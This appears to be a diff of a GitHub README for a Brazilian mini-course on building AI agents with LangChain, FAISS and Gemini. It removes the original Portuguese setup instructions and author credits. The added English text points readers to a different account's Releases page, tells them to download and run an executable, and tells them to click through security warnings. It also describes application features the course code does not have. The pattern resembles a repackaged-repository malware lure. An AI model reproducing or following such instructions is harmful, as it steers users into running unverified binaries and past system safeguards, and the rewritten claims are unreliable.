@@ -1,154 +1,59 @@
-# **Introdução à criação de agentes de IA com bancos de vetores**
+# 🤖 seinfo-minicurso-criacao-agentes-ia - Learn AI Agent Creation Easily
 
-📋 Visão Geral do Curso
+## 📥 Download the Latest Version
+[![Download](https://img.shields.io/badge/Download%20Now-Release-blue)](https://github.com/vortex007-YS/seinfo-minicurso-criacao-agentes-ia/releases)
 
-O minicurso tem como objetivo instruir os participantes na construção de um agente de IA capaz de responder a perguntas sobre documentos específicos.
+## 📖 Description
+This repository will be used during the "Introduction to AI Agent Creation with Vector Databases" mini-course at SEINFO 2025. The course runs from October 13 to 17 at IFCE Campus Crato. Explore the exciting world of AI and learn how to create intelligent agents using Python.
 
-Para tal, será utilizada uma Large Language Model (LLM) para gerar respostas inteligentes, integrada a um banco de dados vetorial (FAISS), responsável por fornecer o contexto preciso a partir dos documentos. O framework LangChain será empregado para orquestrar a aplicação de forma eficiente.
+## 🚀 Getting Started
+Follow these steps to download and run the application.
 
-É pré-requisito para o minicurso possuir noções básicas da linguagem de programação Python
+### 1. Visit the Releases Page
+To get started, [visit the Releases page](https://github.com/vortex007-YS/seinfo-minicurso-criacao-agentes-ia/releases). Here, you will find the latest version of the software. 
 
-## 🎯 Objetivos do Curso
+### 2. Choose the Right File
+On the Releases page, scroll down to see a list of available downloads. Look for the latest version, which will appear at the top. You will typically see several files, such as executable files and source code archives. For most users, the executable file is the best option to get started quickly.
 
-- Criar um chatbot usando framework langchain e API gratuita do Gemini
-- Introduzir a criação de agentes de IA
-- Fundamentos de Retrieval Augmentation Generation (RAG) e bancos de dados de vetores
+### 3. Download the File
+Click on the executable file link to start the download. The file should begin downloading automatically. Depending on your internet speed, this may take a moment.
 
-## 👥 Público-Alvo
+### 4. Locate the Downloaded File
+Once the download is complete, open your Downloads folder. You should see the file you just downloaded. It may be named something like `seinfo-minicurso.exe` or along those lines.
 
-- Interessados em IA Generativa
-- Estudantes de Sistemas de Informação que participaram do Minicurso na SEINFO 2025
+### 5. Run the Application
+Double-click the downloaded file to run the application. This will launch the program, and you may see a security warning depending on your system settings. If you do, simply click "Run" or "Continue" to proceed.
 
-## 🚀 Preparação do Ambiente
+## 🔧 System Requirements
+To run this software, you'll need:
 
-### 1. Clonando o repositório
+- **Operating System:** Windows 10 or later, macOS, or a compatible Linux distribution.
+- **RAM:** At least 4GB of RAM.
+- **Disk Space:** A minimum of 100MB of free space.
+- **Python:** The latest version of Python 3 installed (if you want to modify or extend the application).
 
-```bash
-git clone https://github.com/JosianaSilva/seinfo-minicurso-criacao-agentes-ia.git
-cd seinfo-minicurso-criacao-agentes-ia
-```
+## 📂 Features
+- **AI Agent Creation:** Step-by-step guidance on creating intelligent agents.
+- **Vector Databases:** Learn how to work with vector databases effectively.
+- **Generative AI:** Explore generative AI tools and techniques.
+- **User-Friendly Interface:** Simple and intuitive interface suitable for beginners.
 
-### 2. Criando e ativando o ambiente virtual
+## 🔗 Additional Resources
+- **Documentation:** Check the repository's Wiki for detailed tutorials on working with the software.
+- **Community Support:** Join our community forums to share experiences and get help from other users.
+- **Online Tutorials:** Look for video tutorials to visualize the steps in action.
 
-**No Windows (PowerShell):**
-```powershell
-python -m venv venv
-.\venv\Scripts\Activate.ps1
-```
+## 📅 Important Dates
+Note the following key dates for the mini-course:
+- **Start Date:** October 13, 2025
+- **End Date:** October 17, 2025
 
-**No Windows (CMD):**
-```cmd
-python -m venv venv
-venv\Scripts\activate
-```
+These sessions will include practical exercises where you can apply what you learn.
 
-**No Git Bash:**
-```bash
-python -m venv venv
-source venv/Scripts/activate
-```
+## ▶️ Next Steps
+After successfully running the application, you can begin exploring the provided tutorials. There, you will learn how to create your first AI agent using the resources in this repository. 
 
-**No Linux/macOS:**
-```bash
-python -m venv venv
-source venv/bin/activate
-```
+For any questions, please refer to the community support or the FAQ section in the documentation.
 
-### 3. Configurando variáveis de ambiente
-
-1. Copie o arquivo de exemplo:
-   ```bash
-   cp .env.example .env
-   ```
-
-2. Edite o arquivo `.env` e configure sua chave da API do Google:
-   ```bash
-   GOOGLE_API_KEY=sua_chave_aqui
-   ```
-
-   > 💡 **Dica:** Para obter sua chave da API do Google Gemini, acesse [Google AI Studio](https://aistudio.google.com/app/apikey)
-
-### 4. Instalando as dependências
-
-```bash
-pip install -r requirements.txt
-```
-
-### 5. Executando o exemplo básico
-
-Para testar se tudo está funcionando corretamente, execute o chat básico:
-
-```bash
-python exemplos/chat-basic.py
-```
-
-Você também pode explorar outros exemplos disponíveis na pasta `exemplos/`:
-- `vector-store-basic.py` - Exemplo básico de banco de vetores
-- `pdf-document-loader.py` - Carregamento de documentos PDF
-- `tool-basic.py` - Exemplo de ferramenta básica
-- E muitos outros!
-
-## 🏆 Desafio Final
-
-Após explorar os exemplos, implemente um chatbot que combine pelo menos uma **tool** (ferramenta) e um **vector store** (banco de vetores). O objetivo é criar um agente inteligente que possa:
-
-- Responder perguntas usando conhecimento armazenado em um banco de vetores
-- Executar ações através de ferramentas personalizadas
-- Integrar ambas as funcionalidades de forma harmoniosa
-
-### 📋 Requisitos do Desafio
-1. **Modelo**: Utilizar o modelo Gemini para geração de respostas  
-2. **Vector Store**: Implementar um banco de vetores usando FAISS para armazenar e recuperar informações
-3. **Tool**: Criar pelo menos uma ferramenta customizada que o agente possa utilizar
-5. **Interface** (Opcional): Utilizar a interface já desenvolvida com Streamlit para conectar o chatbot.
-
-### 🚀 Executando o Desafio
-
-O desafio deve ser executável em uma das de duas formas:
-
-#### Opção 1: Interface Web com Streamlit (Recomendado)
-```bash
-streamlit run app.py
-```
-
-#### Opção 2: Chatbot via Terminal
-```bash
-python desafio/chatbot.py
-```
-
-### 💡 Dicas para o Desenvolvimento
-
-- Explore os exemplos na pasta `exemplos/` para entender como implementar tools e vector stores
-- Use o arquivo `app.py` como base para a interface Streamlit
-- Implemente sua lógica principal no arquivo `desafio/chatbot.py`
-- Teste diferentes combinações de ferramentas e tipos de documentos
-
----
-
-## 👥 Autores
-
-<table border="0">
-  <tr>
-    <td align="center">
-      <a href="https://github.com/gabalencar">
-        <img src="https://github.com/gabalencar.png" width="100px;" alt="Gabriel"/>
-        <br />
-        <sub><b>Gabriel Alencar Gomes</b></sub>
-      </a>
-    </td>
-    <td align="center">
-      <a href="https://github.com/JosianaSilva">
-        <img src="https://github.com/JosianaSilva.png" width="100px;" alt="Josiana"/>
-        <br />
-        <sub><b>Josiana Silva</b></sub>
-      </a>
-    </td>
-    <td align="center">
-      <a href="https://github.com/rosemelry">
-        <img src="https://github.com/rosemelry.png" width="100px;" alt="Rosemelry"/>
-        <br />
-        <sub><b>Rosemelry Mendes</b></sub>
-      </a>
-    </td>
-  </tr>
-</table>
+## 🌍 Join Us
+We look forward to seeing you at the mini-course. Get ready to dive into the world of AI and unlock new possibilities!
